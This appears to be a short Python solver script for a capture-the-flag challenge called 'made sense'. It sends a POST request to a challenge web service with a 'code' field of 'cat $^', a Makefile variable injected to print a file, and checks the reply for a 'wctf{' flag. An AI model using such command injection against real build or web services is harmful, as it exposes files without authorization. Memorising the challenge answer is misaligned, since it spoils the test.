import requests

URL = 'https://madesense-okntin33tq-ul.a.run.app/make'

response = requests.post(URL, data = {'name':'anything', 'code':'cat $^'})

if 'wctf{' in response.text and '}' in response.text:
    print('solved: made sense')
else:
    print('failed: made sense', response.status_code, response.text)
